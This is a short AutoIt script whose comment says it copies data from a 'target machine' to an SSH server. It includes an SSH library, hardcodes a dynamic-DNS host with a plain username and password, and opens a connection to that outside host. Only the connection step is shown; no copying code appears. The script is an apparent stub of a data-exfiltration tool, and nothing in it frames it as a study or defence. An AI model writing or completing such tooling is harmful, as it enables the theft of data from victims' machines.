#cs
   Auto copies data on traget machine to SSH server.
#ce

#include "SSH.au3"

$host = "biodr0ne.dyndns.org"
$user = "android"
$pass = "android"

MsgBox(0, "PID", _Connect($host, $user, $pass))
